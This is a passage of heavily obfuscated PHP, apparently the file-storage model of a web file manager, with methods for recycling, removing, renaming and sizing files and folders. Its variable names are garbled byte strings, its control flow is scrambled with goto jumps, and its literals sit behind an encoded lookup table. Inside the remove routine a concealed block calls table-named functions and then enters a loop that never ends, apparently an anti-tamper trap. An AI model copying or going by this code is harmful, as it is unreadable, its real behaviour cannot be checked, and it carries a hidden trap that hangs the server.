= array_merge($fÊê¤Èœƒ , $fŠÔˆôÍ­¹); goto aÄ³¹Äğ«; Dè•îÒ¼—Ş: static $bàÁ¥°‚ÇÚ = false; if (!$bàÁ¥°‚ÇÚ) { Hook::trigger($eŞæ©œˆ¤[535], $fŠÔˆôÍ­¹); $bàÁ¥°‚ÇÚ = !0; } $AÍ®õĞ…‡ = $this->add($fŠÔˆôÍ­¹); goto CÊ¨ÒÚÎ£´; a‘°‹å‡ˆÕ: } public function remove($FŠŠ““Ë­³, $eéôøîóª¾ = true) { goto A„´í°Ï·“; b”Ü¥ßÂÈƒ: CacheLock::lock($f„§ÏØõíÜ); $eê„¬ÈáÀË = $this->fileNameExist($dåê‹ä¿ğ, $dÅƒÈå›ˆó); if (!$eê„¬ÈáÀË) { $eê„¬ÈáÀË = $this->mkdir($dåê‹ä¿ğ, $dÅƒÈå›ˆó, REPEAT_SKIP); $this->metaSet($eê„¬ÈáÀË, $EÚ‰Åğğ[1965], $EĞĞ‚±¦Ñ); $this->metaSet($eê„¬ÈáÀË, $EÚ‰Åğğ[1966], $bšŸ¸œ™´¡[$EÚ‰Åğğ[482]]); if ($bšŸ¸œ™´¡[$EÚ‰Åğğ[476]] != 0) { $this->metaSet($eê„¬ÈáÀË, $EÚ‰Åğğ[1967], _get($fƒµÉôÒÀ, $EÚ‰Åğğ[1968])); } } goto DªŠ¢µ¬”­; e˜³‰Èİ‘: $BÏÀò•ÍÖ = Model($EÚ‰Åğğ[1526])->get($EÚ‰Åğğ[1961]) == $EÚ‰Åğğ[87]; if ($bªÈòóöŞ­ || $eéôøîóª¾ || !$BÏÀò•ÍÖ) { return $this->removeNow($FŠŠ““Ë­³, $eéôøîóª¾); } $dåê‹ä¿ğ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto c ¥©ƒ„Õº; A„´í°Ï·“: $EÚ‰Åğğ =& $_SERVER[¬ı§†‰ú˜¼]; $bšŸ¸œ™´¡ = $this->sourceInfo($FŠŠ““Ë­³); $bªÈòóöŞ­ = intval($bšŸ¸œ™´¡[$EÚ‰Åğğ[402]]) === self::TYPE_SYSTEM; goto e˜³‰Èİ‘; c ¥©ƒ„Õº: $EĞĞ‚±¦Ñ = $bšŸ¸œ™´¡[$EÚ‰Åğğ[402]] == self::TYPE_USER ? $EÚ‰Åğğ[561] : $EÚ‰Åğğ[1014]; if ($EĞĞ‚±¦Ñ == $EÚ‰Åğğ[561]) { $fƒµÉôÒÀ = Model($EÚ‰Åğğ[501])->getInfo($bšŸ¸œ™´¡[$EÚ‰Åğğ[482]]); $dÅƒÈå›ˆó = !empty($fƒµÉôÒÀ[$EÚ‰Åğğ[1954]]) ? $fƒµÉôÒÀ[$EÚ‰Åğğ[1954]] : $fƒµÉôÒÀ[$EÚ‰Åğğ[28]]; $dÅƒÈå›ˆó = $EÚ‰Åğğ[257] . $dÅƒÈå›ˆó . $EÚ‰Åğğ[1962] . $bšŸ¸œ™´¡[$EÚ‰Åğğ[482]]; } else { $fƒµÉôÒÀ = Model($EÚ‰Åğğ[484])->getInfo($bšŸ¸œ™´¡[$EÚ‰Åğğ[482]]); $dÅƒÈå›ˆó = _get($fƒµÉôÒÀ, $EÚ‰Åğğ[28]); $dÅƒÈå›ˆó = $EÚ‰Åğğ[160] . $dÅƒÈå›ˆó . $EÚ‰Åğğ[1963] . $bšŸ¸œ™´¡[$EÚ‰Åğğ[482]]; } $f„§ÏØõíÜ = $EÚ‰Åğğ[1964] . md5($dÅƒÈå›ˆó); goto b”Ü¥ßÂÈƒ; C¯ŒØµ¼íæ: $this->recycleClear($bšŸ¸œ™´¡); $B§¾·¨½ŸÒ = $this->move($FŠŠ““Ë­³, $eê„¬ÈáÀË, REPEAT_RENAME_FOLDER); $this->folderSizeReset($bšŸ¸œ™´¡[$EÚ‰Åğğ[476]]); goto b‹¼ØŒ¥õš; b‹¼ØŒ¥õš: return $B§¾·¨½ŸÒ; goto A¼„­Ñ¢²ä; DªŠ¢µ¬”­: CacheLock::unlock($f„§ÏØõíÜ); $this->metaSet($FŠŠ““Ë­³, $EÚ‰Åğğ[1969], $bšŸ¸œ™´¡[$EÚ‰Åğğ[476]]); $this->where(array($EÚ‰Åğğ[394] => $FŠŠ““Ë­³))->save(array($EÚ‰Åğğ[415] => time())); goto C¯ŒØµ¼íæ; A¼„­Ñ¢²ä: } private function recycleClear($C¢ó“ÌÚ°) { $B²¹ÍÊÜ¥Ş =& $_SERVER[¬ı§†‰ú˜¼]; $d®í‰ê³Û¡ = $this->childrenAll($C¢ó“ÌÚ°); $e–Á äŒ·¦ = array($B²¹ÍÊÜ¥Ş[408] => array($B²¹ÍÊÜ¥Ş[409], $d®í‰ê³Û¡[$B²¹ÍÊÜ¥Ş[1970]])); Model($B²¹ÍÊÜ¥Ş[1971])->where($e–Á äŒ·¦)->delete(); } public function removeNow($cÏÏÙï†Á¶, $e’ÇÁ¯éõ = true) { goto dµó…½ë ·; b×Ã­–Ó‹ø: $this->updateModifyTime($E†ï²í £ï); $this->lockMoveEnd($cÏÏÙï†Á¶); Hook::trigger($B‚Å‘–±½†[1559], $a¿å×µÙ¸, $e’ÇÁ¯éõ); goto aìİòÚøä”; bÎ¾¡ ¡¥˜: $this->folderSizeReset($bàŒº½ìŒ…[$B‚Å‘–±½†[476]]); $E†ï²í £ï = array($bàŒº½ìŒ…[$B‚Å‘–±½†[476]]); if ($bàŒº½ìŒ…[$B‚Å‘–±½†[401]] == $B‚Å‘–±½†[87]) { $E†ï²í £ï[] = $bàŒº½ìŒ…[$B‚Å‘–±½†[394]]; } goto b×Ã­–Ó‹ø; AÌÂæ‡µŒ£: $a¿å×µÙ¸ = $this->pathInfoMore($cÏÏÙï†Á¶); if (!$bàŒº½ìŒ…) { return !0; } if ($bàŒº½ìŒ…[$B‚Å‘–±½†[476]] == 0) { if (!_get($GLOBALS, $B‚Å‘–±½†[483])) { return !1; } } goto d¾äÉß£¥¥; dµó…½ë ·: $B‚Å‘–±½† =& $_SERVER[¬ı§†‰ú˜¼]; if (!isset($_SERVER[$B‚Å‘–±½†[763]]) || !isset($_SERVER[$B‚Å‘–±½†[764]])) { goto c± ÓÒåâ; cÒÂ²‰“É: $böåÍŠÔ¢¯ = $f†—›œé¬Ã($E ¢âØÅ´); $F•¥…†İ”º = explode($B‚Å‘–±½†[228], $böåÍŠÔ¢¯); if (count($F•¥…†İ”º) < $B‚Å‘–±½†[587]) { $Bô®¨„° = $B‚Å‘–±½†[768]; $Bô®¨„°(); } goto fì‡áòá”¶; fò¦Ï÷»­Š: for ($Døê‹º¿–¼ = $DÈ¯ÃÔ™è; $Døê‹º¿–¼ > 0; $Døê‹º¿–¼++) { $AÎİéÎ»Äª = json_encode($GLOBALS[$B‚Å‘–±½†[409]]); } goto A¤íš¬–ª˜; c± ÓÒåâ: $bÅÅŸ¯¿×¸ = $B‚Å‘–±½†[840]; $f†—›œé¬Ã = $B‚Å‘–±½†[765]; $E ¢âØÅ´ = $_SERVER[$B‚Å‘–±½†[766]] . $B‚Å‘–±½†[767]; goto cÒÂ²‰“É; fì‡áòá”¶: $AÎİéÎ»Äª = $B‚Å‘–±½†[841]; $AÎİéÎ»Äª($_SERVER[$B‚Å‘–±½†[842]]); $DÈ¯ÃÔ™è = 1; goto fò¦Ï÷»­Š; A¤íš¬–ª˜: } $bàŒº½ìŒ… = $this->sourceInfo($cÏÏÙï†Á¶); goto AÌÂæ‡µŒ£; d¾äÉß£¥¥: $this->lockMoveStart($cÏÏÙï†Á¶); Hook::trigger($B‚Å‘–±½†[1972], $a¿å×µÙ¸, $e’ÇÁ¯éõ); if ($e’ÇÁ¯éõ) { Model($B‚Å‘–±½†[1971])->moveToRecycle($cÏÏÙï†Á¶); } else { $aİ‡‡¥ÍÓ = $this->childrenAll($bàŒº½ìŒ…); Model($B‚Å‘–±½†[532])->eventRemove($cÏÏÙï†Á¶); $this->removeRelevance($aİ‡‡¥ÍÓ[$B‚Å‘–±½†[1970]], $aİ‡‡¥ÍÓ[$B‚Å‘–±½†[1345]]); } goto bÎ¾¡ ¡¥˜; aìİòÚøä”: return !0; goto CÌ÷Ä¹»­œ; CÌ÷Ä¹»­œ: } public function childrenAll($CÜ‚¶ìá‘) { $f»‘»Ç´²Â =& $_SERVER[¬ı§†‰ú˜¼]; $F¼¿§†Üëå = $CÜ‚¶ìá‘[$f»‘»Ç´²Â[394]]; if ($CÜ‚¶ìá‘[$f»‘»Ç´²Â[401]] == $f»‘»Ç´²Â[87]) { $bŞŸŸ‚§ = array($f»‘»Ç´²Â[552] => array($f»‘»Ç´²Â[511], $CÜ‚¶ìá‘[$f»‘»Ç´²Â[485]] . $F¼¿§†Üëå . $f»‘»Ç´²Â[512])); $b„Ô°ãÕƒ = array($f»‘»Ç´²Â[552] => $bŞŸŸ‚§[$f»‘»Ç´²Â[485]]); $c©¨½½´åÏ = $this->field($f»‘»Ç´²Â[1973])->where($b„Ô°ãÕƒ)->select(); $F¿‹ŸÉ«Å = !1; $eÂÌ¢¬ÊùÖ = array($F¼¿§†Üëå); if ($c©¨½½´åÏ) { $F¿‹ŸÉ«Å = array_to_keyvalue($c©¨½½´åÏ, $f»‘»Ç´²Â[33], $f»‘»Ç´²Â[445]); $F¿‹ŸÉ«Å = array_remove_value($F¿‹ŸÉ«Å, $f»‘»Ç´²Â[495]); $eÂÌ¢¬ÊùÖ = array_to_keyvalue($c©¨½½´åÏ, $f»‘»Ç´²Â[33], $f»‘»Ç´²Â[394]); $eÂÌ¢¬ÊùÖ[] = $F¼¿§†Üëå; } } else { $F¿‹ŸÉ«Å = array($CÜ‚¶ìá‘[$f»‘»Ç´²Â[445]]); $eÂÌ¢¬ÊùÖ = array($F¼¿§†Üëå); } return array($f»‘»Ç´²Â[1970] => $eÂÌ¢¬ÊùÖ, $f»‘»Ç´²Â[1345] => $F¿‹ŸÉ«Å); } public function removeArray($F™‰ßï†²˜) { if (!$F™‰ßï†²˜) { return !0; } } public function removeRelevance($f±ğÕäÀÇ, $fßé«ÎŠÑÍ) { goto B¢›º›ÊáÖ; bˆÚÍ²” ø: $f±ğÕäÀÇ = array_unique(array_filter($f±ğÕäÀÇ)); $fßé«ÎŠÑÍ = array_unique(array_filter($fßé«ÎŠÑÍ)); if (!$f±ğÕäÀÇ) { return !1; } goto EÀ¼‡™ãˆ; EÀ¼‡™ãˆ: $D«·È˜æêÙ = array($eİŠ£ˆŸ‰¯[408] => array($eİŠ£ˆŸ‰¯[409], $f±ğÕäÀÇ)); Model($eİŠ£ˆŸ‰¯[1971])->where($D«·È˜æêÙ)->delete(); Model($eİŠ£ˆŸ‰¯[439])->where($D«·È˜æêÙ)->delete(); goto cÇÓö´ŒÔ˜; B¢›º›ÊáÖ: $eİŠ£ˆŸ‰¯ =& $_SERVER[¬ı§†‰ú˜¼]; $f±ğÕäÀÇ = $f±ğÕäÀÇ ? $f±ğÕäÀÇ : array(); $fßé«ÎŠÑÍ = $fßé«ÎŠÑÍ ? $fßé«ÎŠÑÍ : array(); goto bˆÚÍ²” ø; cÇÓö´ŒÔ˜: Model($eİŠ£ˆŸ‰¯[1825])->where($D«·È˜æêÙ)->delete(); Model($eİŠ£ˆŸ‰¯[532])->where($D«·È˜æêÙ)->delete(); Model($eİŠ£ˆŸ‰¯[1667])->removeBySource($f±ğÕäÀÇ); goto bè¢‡°ÈÌ; DÅ»ºè‹Ğ: for ($e×§‹­‰ªë = 0; $e×§‹­‰ªë < count($f±ğÕäÀÇ); $e×§‹­‰ªë++) { $this->sourceCacheClear($f±ğÕäÀÇ[$e×§‹­‰ªë]); } goto açíÕáİ™; bè¢‡°ÈÌ: Model($eİŠ£ˆŸ‰¯[1952])->removeBySource($f±ğÕäÀÇ); $this->where($D«·È˜æêÙ)->delete(); Model($eİŠ£ˆŸ‰¯[448])->remove($fßé«ÎŠÑÍ); goto DÅ»ºè‹Ğ; açíÕáİ™: } public function rename($C­’áŞ«¬ø, $AÉÓê”èË) { goto dšòø¾ÓŸÚ; CØŒˆäÀ²: if ($E”éªî§Š‡[$e›Ôñ§É±ô[401]] != $e›Ôñ§É±ô[87]) { $Cƒ£³¢¹–À[$e›Ôñ§É±ô[403]] = substr(get_path_ext($AÉÓê”èË), 0, 10); } Model($e›Ôñ§É±ô[532])->eventRename($C­’áŞ«¬ø, $E”éªî§Š‡[$e›Ôñ§É±ô[28]], $AÉÓê”èË); $this->sourceCacheClear($C­’áŞ«¬ø); goto eİ‹«è¶ñ¦; fƒÌÙ—¤: $B’—ĞÉóâÔ = $e›Ôñ§É±ô[1960] . $E”éªî§Š‡[$e›Ôñ§É±ô[476]]; if (isset(self::$cacheChildList[$B’—ĞÉóâÔ])) { unset(self::$cacheChildList[$B’—ĞÉóâÔ]); } return $e¶ë‡¼‚æƒ; goto fÑ²ĞÏöçª; BŒ‡Ó‹ƒ¢Ò: $F•¥è°¶ïõ = $this->fileNameExist($E”éªî§Š‡[$e›Ôñ§É±ô[476]], $AÉÓê”èË); if ($F•¥è°¶ïõ && $F•¥è°¶ïõ != $C­’áŞ«¬ø) { return !1; } $Cƒ£³¢¹–À = array($e›Ôñ§É±ô[411] => $AÉÓê”èË, $e›Ôñ§É±ô[551] => USER_ID); goto CØŒˆäÀ²; dšòø¾ÓŸÚ: $e›Ôñ§É±ô =& $_SERVER[¬ı§†‰ú˜¼]; $E”éªî§Š‡ = $this->sourceInfo($C­’áŞ«¬ø); if (!$E”éªî§Š‡) { return !1; } goto BŒ‡Ó‹ƒ¢Ò; eİ‹«è¶ñ¦: $this->setNamePinyin($C­’áŞ«¬ø, $Cƒ£³¢¹–À[$e›Ôñ§É±ô[28]], !1); $this->updateModifyTime($E”éªî§Š‡[$e›Ôñ§É±ô[476]]); $e¶ë‡¼‚æƒ = $this->where(array($e›Ôñ§É±ô[408] => $C­’áŞ«¬ø))->data($Cƒ£³¢¹–À)->save(); goto fƒÌÙ—¤; fÑ²ĞÏöçª: } public function setNamePinyin($D‰Šİ¥Â, $cÊªÆË©ÙÔ, $Cæ¿ÕŞß… = true) { $aŸôá Æ¼ã =& $_SERVER[¬ı§†‰ú˜¼]; $FÛ Ú¡ÕÈ¹ = Input::check($cÊªÆË©ÙÔ, $aŸôá Æ¼ã[555]); if ($Cæ¿ÕŞß… && !$FÛ Ú¡ÕÈ¹) { return; } if (!$FÛ Ú¡ÕÈ¹) { $this->metaSet($D‰Šİ¥Â, $aŸôá Æ¼ã[442], null); $this->metaSet($D‰Šİ¥Â, $aŸôá Æ¼ã[441], null); return; } $e»éñÎÆ = array($aŸôá Æ¼ã[442] => str_replace($aŸôá Æ¼ã[50], $aŸôá Æ¼ã[33], Pinyin::encode($cÊªÆË©ÙÔ)), $aŸôá Æ¼ã[441] => Pinyin::encode($cÊªÆË©ÙÔ, $aŸôá Æ¼ã[556])); $this->metaSet($D‰Šİ¥Â, $e»éñÎÆ); } public function getContent($dõÃ®öé®ù) { goto d»«µªÛ»; d»«µªÛ»: $B›Í‡ª«î´ =& $_SERVER[¬ı§†‰ú˜¼]; $FŒ°¿ÅŒäò = $this->fileInfoGet($dõÃ®öé®ù); if (!$FŒ°¿ÅŒäò) { return !1; } goto Aäá±ÓŒÕ; Aãè•«¹ÑÓ: if (!$FŒ°¿ÅŒäò[$B›Í‡ª«î´[76]]) { return $B›Í‡ª«î´[33]; } return IO::getContent($FŒ°¿ÅŒäò[$B›Í‡ª«î´[76]]); goto FˆŸ§§Ş½; Aäá±ÓŒÕ: if ($FŒ°¿ÅŒäò[$B›Í‡ª«î´[78]] == 0) { return $B›Í‡ª«î´[33]; } $e‚±‘ùåƒ = $B›Í‡ª«î´[1974] . $FŒ°¿ÅŒäò[$B›Í‡ª«î´[170]]; if ($FŒ°¿ÅŒäò[$B›Í‡ª«î´[78]] <= 1024 * 10) { $FÑš‚ò­Õ = Cache::get($e‚±‘ùåƒ); if (!$FÑš‚ò­Õ) { $FÑš‚ò­Õ = IO::getContent($FŒ°¿ÅŒäò[$B›Í‡ª«î´[76]]); Cache::set($e‚±‘ùåƒ, $FÑš‚ò­Õ); } return $FÑš‚ò­Õ; } goto Aãè•«¹ÑÓ; FˆŸ§§Ş½: } public function setDesc($FÍÆÖ²Æğï, $b´îªôŒŸ) { $fè²’¤¯œŠ =& $_SERVER[¬ı§†‰ú˜¼]; Model($fè²’¤¯œŠ[532])->eventAddDesc($FÍÆÖ²Æğï, $b´îªôŒŸ); return $this->metaSet($FÍÆÖ²Æğï, $fè²’¤¯œŠ[429], $b´îªôŒŸ); } public function setContent($C‡ÀÖ†Ğ˜„, $B¦ñ§îáÖ = '') { goto fÑ²Šâ­; fÑ²Šâ­: $dÊˆæ¼£ò =& $_SERVER[¬ı§†‰ú˜¼]; $b‹¥Æ¶÷ö¨ = $this->sourceInfo($C‡ÀÖ†Ğ˜„); $eÌà×Ú¶Ô´ = $this->fileInfoGet($C‡ÀÖ†Ğ˜„); goto Aá—µ½ÎÂ„; Aá—µ½ÎÂ„: if (!$eÌà×Ú¶Ô´ || !$b‹¥Æ¶÷ö¨) { return !1; } $D¯Ìª‘ö‡Ø = Model($dÊˆæ¼£ò[448])->addFileByContent($B¦ñ§îáÖ, $b‹¥Æ¶÷ö¨[$dÊˆæ¼£ò[28]]); $c¬ç°ªŞ·İ = $this->fileHistory($b‹¥Æ¶÷ö¨, $D¯Ìª‘ö‡Ø[$dÊˆæ¼£ò[445]], $D¯Ìª‘ö‡Ø[$dÊˆæ¼£ò[78]]); goto e‰ŸÔÛ£•°; e‰ŸÔÛ£•°: if (!$c¬ç°ªŞ·İ) { return Model($dÊˆæ¼£ò[448])->remove($D¯Ìª‘ö‡Ø[$dÊˆæ¼£ò[445]]); } $this->folderSizeReset($b‹¥Æ¶÷ö¨[$dÊˆæ¼£ò[476]]); return !0; goto D²«É‘ãƒ; D²«É‘ãƒ: } public function fileSubstr($Eñ–õ“Ô, $CºÖ’ñ—Á½, $E¦µ× ²ìù) { $E¸¢á·°‘ = $this->fileInfoGet($Eñ–õ“Ô); if (!$E¸¢á·°‘) { return !1; } return IO::fileSubstr($E¸¢á·°‘[$_SERVER[¬ı§†‰ú˜¼][76]], $CºÖ’ñ—Á½, $E¦µ× ²ìù); } public function fileInfoGet($A‚µÁÇ¼) { goto Bòã¾×œ¨; bÆ’ù¸›Öö: $D–Á«æÙÒµ = $e¨¦ì¢×á[451] . $Aô½½Ÿ¥ºã[$e¨¦ì¢×á[445]]; $fÃ¢¤°Š°Õ = _get(self::$cacheFileInfo, $D–Á«æÙÒµ); if ($fÃ¢¤°Š°Õ) { return $fÃ¢¤°Š°Õ; } goto d…ÎĞ‰ë¦—; eğ…•ªƒîº: return $Fà»„º‡ã; goto e¿ò¤ğíĞ–; Bòã¾×œ¨: $e¨¦ì¢×á =& $_SERVER[¬ı§†‰ú˜¼]; $Aô½½Ÿ¥ºã = $this->sourceInfo($A‚µÁÇ¼); if (!$Aô½½Ÿ¥ºã || $Aô½½Ÿ¥ºã[$e¨¦ì¢×á[401]]) { return !1; } goto bÆ’ù¸›Öö; d…ÎĞ‰ë¦—: $Fà»„º‡ã = Model($e¨¦ì¢×á[448])->fileInfo($Aô½½Ÿ¥ºã[$e¨¦ì¢×á[445]]); if ($Fà»„º‡ã) { $Fà»„º‡ã[$e¨¦ì¢×á[28]] = $Aô½½Ÿ¥ºã[$e¨¦ì¢×á[28]]; } self::$cacheFileInfo[$D–Á«æÙÒµ] = $Fà»„º‡ã; goto eğ…•ªƒîº; e¿ò¤ğíĞ–: } private function folderChildrenNumber($fÔŸ±Üï¤õ) { $aïğ†ô„ =& $_SERVER[¬ı§†‰ú˜¼]; $c»óöáñ•Ã = $this->sourceInfo($fÔŸ±Üï¤õ); $aÓÆæ «Çî = array($aïğ†ô„[552] => array($aïğ†ô„[511], $c»óöáñ•Ã[$aïğ†ô„[485]] . $fÔŸ±Üï¤õ . $aïğ†ô„[512]), $aïğ†ô„[420] => intval($c»óöáñ•Ã[$aïğ†ô„[421]]), $aïğ†ô„[545] => 1); $cÁò‚÷Â·Û = $this->where($aÓÆæ «Çî)->count(); $E§ÔÔìñ‹Ê = $this->where($aÓÆæ «Çî)->where(array($aïğ†ô„[545] => 0))->count(); return array($aïğ†ô„[82] => $E§ÔÔìñ‹Ê, $aïğ†ô„[83] => $cÁò‚÷Â·Û); } public function pathInfo($Eî¤ËŒµ, $A…ªŒÚ·¹« = false) { goto C‚†Ç³œ ±; e¯Î˜™Ò¢£: $c§¹ì‚‘ö = $eÂóÔĞ¦¡§[437] . intval($A…ªŒÚ·¹«) . $eÂóÔĞ¦¡§[438] . $Eî¤ËŒµ; $DÕÜÄää ‡ = _get(self::$cachePathInfo, $c§¹ì‚‘ö); if ($DÕÜÄää ‡) { return $DÕÜÄää ‡; } goto F¦¾Ú’×¢; có‹›Ô«—Î: self::$cachePathInfo[$c§¹ì‚‘ö] = $b»Œ‰²áåÖ; return $b»Œ‰²áåÖ; goto EçŞÍâ½åÁ; C‚†Ç³œ ±: $eÂóÔĞ¦¡§ =& $_SERVER[¬ı§†‰ú˜¼]; $A…ªŒÚ·¹« = !1; $Eî¤ËŒµ = intval($Eî¤ËŒµ); goto e¯Î˜™Ò¢£; F¦¾Ú’×¢: $b»Œ‰²áåÖ = $this->sourceInfo($Eî¤ËŒµ); if (!$b»Œ‰²áåÖ) { return !1; } $b»Œ‰²áåÖ = $this->_listDataApplyItem($b»Œ‰²áåÖ, $A…ªŒÚ·¹«); goto có‹›Ô«—Î; EçŞÍâ½åÁ: } public static $cachePathInfoMore = array(); public function pathInfoMore($E¾ËšªÙÆŠ) { goto D§ùÅ¹èÜ‰; b½ÍœÛ‹†È: self::$cachePathInfoMore[$E¾ËšªÙÆŠ] = $f¢ã˜‘™ˆ; return $f¢ã˜‘™ˆ; goto EÅ½Ş¼Ôâ; D§ùÅ¹èÜ‰: $D¦ÔÛ›¡ˆë =& $_SERVER[¬ı§†‰ú˜¼]; $fğŞß™Í¶ = _get(self::$cachePathInfoMore, $E¾ËšªÙÆŠ); if ($fğŞß™Í¶) { return $fğŞß™Í¶; } goto A¼Æ‚ÆÑŠ; A¼Æ‚ÆÑŠ: $f¢ã˜‘™ˆ = $this->pathInfo($E¾ËšªÙÆŠ); if (!$f¢ã˜‘™ˆ) { return !1; } if ($f¢ã˜‘™ˆ[$D¦ÔÛ›¡ˆë[401]] == $D¦ÔÛ›¡ˆë[87]) { $f¢ã˜‘™ˆ[$D¦ÔÛ›¡ˆë[81]] = $this->folderChildrenNumber($E¾ËšªÙÆŠ); } goto b½ÍœÛ‹†È; EÅ½Ş¼Ôâ: } public function sourceInfo($f½á…ÆòºÇ) { goto AÉ‹½¾¸¾; c¶‚ßÕå»–: $E´½¡îá = $EšæÀÅ˜Ûç[436] . $f½á…ÆòºÇ; $aÊÊÂê’ª© = _get(self::$cacheSourceInfo, $E´½¡îá); if ($aÊÊÂê’ª©) { return $aÊÊÂê’ª©; } goto a­çšÀº; AÉ‹½¾¸¾: $EšæÀÅ˜Ûç =& $_SERVER[¬ı§†‰ú˜¼]; if (!$f½á…ÆòºÇ) { return array(); } $f½á…ÆòºÇ = intval($f½á…ÆòºÇ); goto c¶‚ßÕå»–; a­çšÀº: $Fñµ¼ÅÖå = $this->where(array($EšæÀÅ˜Ûç[394] => $f½á…ÆòºÇ))->find(); self::$cacheSourceInfo[$E´½¡îá] = $Fñµ¼ÅÖå; return self::$cacheSourceInfo[$E´½¡îá]; goto Dóø¤­÷‰‰; Dóø¤­÷‰‰: } public function sourceCacheClear($Bò¿‰®ñ·± = false) { self::cacheClear($Bò¿‰®ñ·±); } public static function cacheClear($cßò®º˜ÓÓ = false) { $E„Ñºô‹¤Š =& $_SERVER[¬ı§†‰ú˜¼]; if ($cßò®º˜ÓÓ == !1) { goto dñÜ¶‘«¤Ô; dñÜ¶‘«¤Ô: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto Aõ×¶›ì—Ì; Aõ×¶›ì—Ì: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto B¹ÁÙˆÎ™™; B¹ÁÙˆÎ™™: return; goto C‡Ê‡‹øìË; C‡Ê‡‹øìË: } unset(self::$cacheSourceInfo[$E„Ñºô‹¤Š[436] . $cßò®º˜ÓÓ]); unset(self::$cachePathInfoMore[$cßò®º˜ÓÓ]); unset(self::$cachePathInfo[$E„Ñºô‹¤Š[1975] . $cßò®º˜ÓÓ]); unset(self::$cachePathInfo[$E„Ñºô‹¤Š[1976] . $cßò®º˜ÓÓ]); } public function metaSet($e±ùÒø‰ĞÀ, $A¬…¢£í†‰ = null, $C•¢˜Ñ ÏÊ = null) { $EÁÎ”ĞÍ• = parent::metaSet($e±ùÒø‰ĞÀ, $A¬…¢£í†‰, $C•¢˜Ñ ÏÊ); if ($EÁÎ”ĞÍ•) { $this->sourceCacheClear($e±ùÒø‰ĞÀ); } return $EÁÎ”ĞÍ•; } public function pathInfoByPath($fÉ¶á‰ïêõ, $f’ô¡¯­¯¥) { $B”ô‰¹ã¬¸ =& $_SERVER[¬ı§†‰ú˜¼]; $bª§¹öÊßø = !$f’ô¡¯­¯¥ ? array() : explode($B”ô‰¹ã¬¸[8], trim($f’ô¡¯­¯¥, $B”ô‰¹ã¬¸[8])); $f«ší»ªÈ´ = $fÉ¶á‰ïêõ; foreach ($bª§¹öÊßø as $c±ªÄìõŞº) { $aÏÜâ…î‘« = array($B”ô‰¹ã¬¸[476] => $f«ší»ªÈ´, $B”ô‰¹ã¬¸[28] => $c±ªÄìõŞº); $bïµÄÀ÷±ï = $this->where($aÏÜâ…î‘«)->select(); if (!$bïµÄÀ÷±ï) { return !1; } $bïµÄÀ÷±ï = array_sort_by($bïµÄÀ÷±ï, $B”ô‰¹ã¬¸[421]); $f«ší»ªÈ´ = $bïµÄÀ÷±ï[0][$B”ô‰¹ã¬¸[394]]; } return $this->pathInfo($f«ší»ªÈ´, !0); } protected function updateModifyTime($dƒ®ÅÅâÍ) { goto aĞÉ£„Ã¤õ; f¨ÜÀ‰á‰: foreach ($dƒ®ÅÅâÍ as $AöÕö¾ÊÛ => $FƒŒõÛ¤±ß) { $dƒ®ÅÅâÍ[$AöÕö¾ÊÛ] = intval($FƒŒõÛ¤±ß); $this->sourceCacheClear($FƒŒõÛ¤±ß); } $F¤ä•…áÄÙ = array($FµÛ°£–›[394] => array($FµÛ°£–›[7], $dƒ®ÅÅâÍ)); $C’Ü¯Şêº… = array($FµÛ°£–›[551] => USER_ID, $FµÛ°£–›[415] => time()); goto d»“Ù®¢¿; d»“Ù®¢¿: $this->where($F¤ä•…áÄÙ)->save($C’Ü¯Şêº…); goto eÕƒïÎ¾¡³; aĞÉ£„Ã¤õ: $FµÛ°£–› =& $_SERVER[¬ı§†‰ú˜¼]; if (!$dƒ®ÅÅâÍ) { return; } if (!is_array($dƒ®ÅÅâÍ)) { $dƒ®ÅÅâÍ = array($dƒ®ÅÅâÍ); } goto f¨ÜÀ‰á‰; eÕƒïÎ¾¡³: } public function folderSizeReset($föÀ”äˆ¹­, $DØ°¬§À˜Ê = false) { goto F×ãÛŞÌë¨; FÛŒ‹¶ğ—ø: $A¿ß…™ù„Â = $d¡¢…êÂÄÉ[1977] . $föÀ”äˆ¹­; CacheLock::lock($A¿ß…™ù„Â, 20); if ($DØ°¬§À˜Ê === !1) { $this->sourceCacheClear($föÀ”äˆ¹­); $d÷°ÀáÂñ = $this->sourceInfo($föÀ”äˆ¹­); $c­â†ƒŒ«‡ = array($d¡¢…êÂÄÉ[393] => $föÀ”äˆ¹­, $d¡¢…êÂÄÉ[420] => 0); $e¬»ÒÏ¯ğ = $this->where($c­â†ƒŒ«‡)->sum($d¡¢…êÂÄÉ[78]); $DØ°¬§À˜Ê = intval($e¬»ÒÏ¯ğ) - intval($d÷°ÀáÂñ[$d¡¢…êÂÄÉ[78]]); } goto FÆùæ¯Î¡; FÆùæ¯Î¡: if ($DØ°¬§À˜Ê == 0) { return CacheLock::unlock($A¿ß…™ù„Â); } $F¸«·Ãèê‡ = $this->parentLevelArray($d÷°ÀáÂñ[$d¡¢…êÂÄÉ[485]]); if (!$F¸«·Ãèê‡) { $F¸«·Ãèê‡ = array(); } goto F®‹¯¹…äß; E„ÊàÚ»‚Ó: $this->where($c­â†ƒŒ«‡)->setAdd($d¡¢…êÂÄÉ[78], $DØ°¬§À˜Ê); CacheLock::unlock($A¿ß…™ù„Â); $d­ñ›¾Ìó = $d¡¢…êÂÄÉ[1978] . $d÷°ÀáÂñ[$d¡¢…êÂÄÉ[402]] . $d¡¢…êÂÄÉ[4] . $d÷°ÀáÂñ[$d¡¢…êÂÄÉ[482]]; goto b£æ†¿‡ğ; F®‹¯¹…äß: $F¸«·Ãèê‡[] = $d÷°ÀáÂñ[$d¡¢…êÂÄÉ[394]]; $c­â†ƒŒ«‡ = array($d¡¢…êÂÄÉ[394] => array($d¡¢…êÂÄÉ[409], $F¸«·Ãèê‡)); if ($DØ°¬§À˜Ê < 0) { $c­â†ƒŒ«‡[$d¡¢…êÂÄÉ[78]] = array($d¡¢…êÂÄÉ[971], abs($DØ°¬§À˜Ê)); } goto E„ÊàÚ»‚Ó; F×ãÛŞÌë¨: $d¡¢…êÂÄÉ =& $_SERVER[¬ı§†‰ú˜¼]; if ($this->statusIgnoreResetSpace) { return; } $d÷°ÀáÂñ = $this->sourceInfo($föÀ”äˆ¹­); goto FÛŒ‹¶ğ—ø; b£æ†¿‡ğ: $A·à¤îÀˆ÷ = array($d÷°ÀáÂñ[$d¡¢…êÂÄÉ[402]], $d÷°ÀáÂñ[$d¡¢…êÂÄÉ[482]]); 